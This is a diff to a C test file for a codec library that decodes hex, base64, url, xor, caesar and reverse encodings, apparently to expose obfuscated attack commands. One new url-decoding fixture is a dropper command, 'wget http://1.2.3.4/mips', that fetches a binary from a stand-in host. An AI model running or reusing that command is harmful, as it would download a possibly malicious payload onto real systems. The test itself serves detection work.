@@ -79,6 +79,15 @@ int main(void)
 	one("b64 encode",    KOF_CODEC_B64,    0, 1, "cmd.exe", "Y21kLmV4ZQ==");
 	one("b64 decode",    KOF_CODEC_B64,    0, 0, "Y21kLmV4ZQ==", "cmd.exe");
 	one("b64 wrapped",   KOF_CODEC_B64,    0, 0, "Y21k\nLmV4ZQ==", "cmd.exe");
+	/* The shape the norm view decodes: a dropper's command as a form
+	 * body, where `+` is a space and the separators are spelled in hex. */
+	one("url decode",    KOF_CODEC_URL,    0, 0,
+	    "Cmd=wget+http%3A%2F%2F1.2.3.4%2Fmips",
+	    "Cmd=wget http://1.2.3.4/mips");
+	one("url encode",    KOF_CODEC_URL,    0, 1, "wget http://a/b",
+	    "wget%20http%3A%2F%2Fa%2Fb");
+	/* Lower case digits are read; only writing picks a case. */
+	one("url lower",     KOF_CODEC_URL,    0, 0, "a%2fb", "a/b");
 	/* 'c'^0x41 = 0x22, 'm'^0x41 = 0x2c, 'd'^0x41 = 0x25. */
 	one("xor",           KOF_CODEC_XOR, 0x41, 0, "cmd", "\",%");
 	one("reverse",       KOF_CODEC_REVERSE, 0, 1, "cmd", "dmc");
@@ -106,6 +115,11 @@ int main(void)
 	one("hex odd digit",  KOF_CODEC_HEX, 0, 0, "636D6", NULL);
 	one("hex not hex",    KOF_CODEC_HEX, 0, 0, "zzzz", NULL);
 	one("b64 not b64",    KOF_CODEC_B64, 0, 0, "not base64!", NULL);
+	/* Text with no escape in it was not written this way, and a `%` that
+	 * is not one says the same. */
+	one("url no escape",  KOF_CODEC_URL, 0, 0, "cmd.exe", NULL);
+	one("url bad escape", KOF_CODEC_URL, 0, 0, "a%zzb", NULL);
+	one("url cut escape", KOF_CODEC_URL, 0, 0, "a%4", NULL);
 	/* A shift of nothing is not a coding, in either direction. */
 	one("caesar zero dec", KOF_CODEC_CAESAR, 0,  0, "cmd", NULL);
 	one("caesar zero enc", KOF_CODEC_CAESAR, 26, 1, "cmd", NULL);
@@ -128,6 +142,7 @@ int main(void)
 		bad("keyed", "a coding with a typed key says it has none");
 	if (kof_codec_keyed(KOF_CODEC_B64) ||
 	    kof_codec_keyed(KOF_CODEC_HEX) ||
+	    kof_codec_keyed(KOF_CODEC_URL) ||
 	    kof_codec_keyed(KOF_CODEC_REVERSE))
 		bad("keyed", "a coding with no key says it has one");
 
@@ -158,7 +173,7 @@ int main(void)
 		printf("codec forms: %d check(s) failed\n", fails);
 		return 1;
 	}
-	printf("codec forms: hex, base64, xor, add, caesar, reverse - both "
+	printf("codec forms: hex, base64, url, xor, add, caesar, reverse - both "
 	       "ways, round trips, refusals - ok\n");
 	return 0;
 }
